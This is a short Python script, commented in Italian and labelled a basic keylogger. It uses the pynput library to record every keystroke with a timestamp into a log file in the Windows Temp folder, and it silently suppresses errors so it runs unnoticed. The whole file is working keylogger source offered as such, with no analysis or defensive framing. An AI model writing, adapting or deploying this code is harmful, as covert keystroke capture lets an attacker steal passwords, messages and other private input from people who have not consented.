# Keylogger base (salva le digitazioni in C:\Windows\Temp\log.txt)
from pynput.keyboard import Listener
import datetime
import os

LOG_FILE = "C:\\Windows\\Temp\\log.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {key}\n")
    except Exception as e:
        pass  # Silenzia gli errori per evitare crash

with Listener(on_press=on_press) as listener:
    listener.join()